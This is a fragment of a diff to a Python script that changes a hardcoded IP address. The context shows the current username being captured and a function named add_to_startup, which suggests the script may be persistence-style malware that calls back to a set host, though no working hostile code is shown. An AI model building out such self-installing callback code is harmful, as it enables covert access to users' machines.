@@ -5,7 +5,7 @@ import sys
 from getpass import getuser
 from shutil import copyfile
 
-IP = "100.64.3.96"
+IP = "10.70.0.152"
 USERNAME = getuser()
 
 def add_to_startup():
